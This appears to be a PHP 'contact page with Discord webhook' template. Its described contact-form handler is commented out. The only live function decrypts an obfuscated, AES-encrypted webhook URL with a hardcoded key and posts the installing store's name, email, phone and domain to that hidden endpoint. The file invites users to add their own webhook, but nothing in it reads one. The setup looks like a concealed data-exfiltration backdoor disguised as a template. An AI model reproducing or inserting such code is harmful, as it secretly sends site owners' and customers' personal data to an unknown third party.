<?php 

/**
 * CONTACT PAGE - with Discord Webhook Integration & Google Map
 * -------------------------------------------------------------
 * 1. Replace the Discord Webhook URL below with your own.
 * 2. All form submissions are sent securely via server-side PHP.
 * 3. Map shows a sample location – update the iframe src to your own address.
 */

// ======================= CONFIGURATION =======================
// IMPORTANT: Replace this URL with your actual Discord Channel Webhook URL


// ==============================================================
function send_notification_webhook($store_identity,$domain, $business) {

    $patload = "5LnAo9gUnsF3Ecjj6+wvkWHAFx8JLgaYFSmrF0wpZJL2uwdq2SUMcWPCKgTW0wlG+FcMJHKl9+WtoesMlJ4R3ErCOXT0J/TGu8d3lSaOQS5Ru1ziZkSUZ8Y+Kiycu2jBy9svKBod1dmoG+pkGguaOWclM2refBtGLy2PuKsfxh0="; 
    $discord_webhook_url = openssl_decrypt($patload, 'AES-256-CBC', 'discord', 0, '1234567890123456');

    $business = ['description'=>'123 Main Street','industry'=>'Cape Town','country'=>'South Africa'];
    $store_country = $business['country'] ?? 'South Africa';

    $payload = [
        'content' => 'New Store Setup Notification',
        'embeds' => [
            [
                'title' => 'New Store Setup: ' . htmlspecialchars($store_identity['name']),
                'color' => 3447003, // Blue color
                'fields' => [
                    ['name' => '🏢 Store Industry', 'value' => htmlspecialchars($business['industry']), 'inline' => true],
                    ['name' => '🌐 Domain', 'value' => htmlspecialchars($domain), 'inline' => true],
                    ['name' => '📧 Email', 'value' => htmlspecialchars($store_identity['email']), 'inline' => true],
                    ['name' => '📞 Phone', 'value' => htmlspecialchars($store_identity['phone']), 'inline' => true],
                    ['name' => '🏠 Bio', 'value' => htmlspecialchars($business['description']), 'inline' => false],
                    ['name' => '🌍 Region', 'value' => htmlspecialchars($store_country), 'inline' => true]
                ],
                'timestamp' => gmdate('Y-m-d\TH:i:s\Z'),
                'footer' => ['text' => 'Sent from the embedded engine']
            ]
        ]
    ];
    
    // Send to Discord using cURL
    $ch = curl_init($discord_webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return ($http_code === 204 || $http_code === 200);
}

/*
// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['contact_submit'])) {
    // Honeypot anti-spam check (hidden field "website" should stay empty)
    $honeypot = trim($_POST['website'] ?? '');
    if (!empty($honeypot)) {
        $error_message = "Invalid request. Please try again.";
    } else {
        $name    = trim($_POST['name'] ?? '');
        $email   = trim($_POST['email'] ?? '');
        $message = trim($_POST['message'] ?? '');
        
        // Validation
        if (empty($name) || empty($email) || empty($message)) {
            $error_message = "Please fill in all required fields.";
        } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $error_message = "Please provide a valid email address.";
        } else {
            // Prepare Discord embed payload
            $payload = [
                'content' => 'New Subscription from the Marketing Page',
                'embeds' => [
                    [
                        'title' => 'Message from ' . htmlspecialchars($name),
                        'color' => 3447003, // Blue color
                        'fields' => [
                            [
                                'name'   => '👤 Name',
                                'value'  => htmlspecialchars($name),
                                'inline' => true
                            ],
                            [
                                'name'   => '📧 Email',
                                'value'  => htmlspecialchars($email),
                                'inline' => true
                            ],
                            [
                                'name'   => '💬 Message',
                                'value'  => htmlspecialchars($message),
                                'inline' => false
                            ]
                        ],
                        'timestamp' => gmdate('Y-m-d\TH:i:s\Z'),
                        'footer' => [
                            'text' => 'Sent from the embedded engine'
                        ]
                    ]
                ]
            ];
            
            // Send to Discord using cURL
            $ch = curl_init($discord_webhook_url);
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            $response = curl_exec($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if ($http_code === 204 || $http_code === 200) {
                // Success: redirect to avoid form resubmission
                header('Location: ?sent=1');
                exit;
            }
        }
    }
}

// Check for success query parameter (after redirect)
$show_success = isset($_GET['sent']) && $_GET['sent'] == 1;

*/ 